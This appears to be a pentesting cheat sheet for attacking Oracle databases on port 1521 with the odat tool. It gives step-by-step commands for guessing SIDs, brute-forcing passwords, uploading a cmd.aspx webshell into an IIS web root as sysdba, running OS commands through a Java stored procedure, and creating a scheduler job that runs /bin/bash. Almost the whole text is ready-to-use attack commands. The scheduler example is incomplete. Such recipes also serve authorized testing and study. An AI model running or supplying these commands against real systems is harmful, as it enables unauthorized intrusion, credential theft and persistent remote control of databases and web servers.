# Oracle TNS odat File Upload RCE

Oracle DB on port 1521 — use `odat` (Oracle Database Attacking Tool) to enumerate and exploit.

**Setup** (Kali):
```bash
apt install odat
# or: pip install odat
# also needs sqlplus from oracle instant client
export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2
alias sqlplus='/opt/oracle/instantclient_12_2/sqlplus'
```

**Enumerate SIDs and credentials:**
```bash
odat sidguesser -s <TARGET> -p 1521
odat passwordguesser -s <TARGET> -p 1521 -d <SID>
```

**Upload a webshell via UTL_FILE / Java:**
```bash
odat utlfile -s <TARGET> -p 1521 -U <user> -P <pass> -d <SID> \
  --sysdba --putFile C:\\inetpub\\wwwroot cmd.aspx /tmp/cmd.aspx
```

**Execute OS commands via Java stored procedure:**
```bash
odat java -s <TARGET> -p 1521 -U <user> -P <pass> -d <SID> \
  --sysdba --exec "whoami"
```

**Direct sqlplus:**
```bash
sqlplus <user>/<pass>@<TARGET>:1521/<SID> as sysdba
SQL> exec DBMS_SCHEDULER.CREATE_JOB(job_name=>'cmd',job_type=>'EXECUTABLE',job_action=>'/bin/bash',number_of_arguments=>3,start_date=>SYSTIMESTAMP,enabled=>FALSE);
```
